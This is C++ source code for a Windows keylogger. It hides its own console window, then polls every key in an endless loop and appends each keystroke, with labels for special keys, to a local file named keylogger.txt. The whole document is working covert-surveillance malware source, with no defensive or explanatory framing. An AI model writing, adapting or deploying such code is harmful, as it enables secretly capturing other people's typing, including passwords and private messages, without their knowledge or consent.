#include<iostream>
#include<fstream>
#include<windows.h>
using namespace std;

#define LOG_FILE "keylogger.txt"

void saveData(string data)
{
	fstream logFile;

	// open file
	logFile.open(LOG_FILE, ios::app);

	// write data
	logFile << data;

	// close file
	logFile.close();
}

// translate special key int into string
string translateSpecialKey(int key)
{
	string result;
	switch (key)
	{
	case VK_SPACE:
		result = " ";
		break;
	case VK_RETURN:
		result = "\n";
		break;
	case VK_BACK:
		result = "\b";
		break;
	case VK_CAPITAL:
		result = "[CAPS_LOCK]";
		break;
	case VK_TAB:
		result = "[TAB]";
		break;
	case VK_CONTROL:
		result = "[CTRL]";
		break;
	case VK_MENU:
		result = "[ALT]";
		break;
	default:
		break;
	}

	return result;
}

int main()
{
	int specialKeyArray[] = { VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_TAB, VK_CONTROL, VK_MENU };
	string specialKeyChar;
	bool isSpecialKey;

	// hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	while (true)
	{
		for (int key = 8; key <= 198; key++)
		{
			// check key is pressed
			if (GetAsyncKeyState(key) == -32767)
			{
				// key is pressed, check if key is special key
				isSpecialKey = find(begin(specialKeyArray), end(specialKeyArray), key) != end(specialKeyArray);
				if (isSpecialKey)
				{
					// translate special key
					specialKeyChar = translateSpecialKey(key);
					// save data
					saveData(specialKeyChar);
				}
				else {
					// check if uppercase or lowercase
					if (GetKeyState(VK_CAPITAL)) {
						saveData(string(1, (char)key));
					}
					else {
						saveData(string(1, (char)tolower(key)));
					}
				}
			}
		}
	}
}
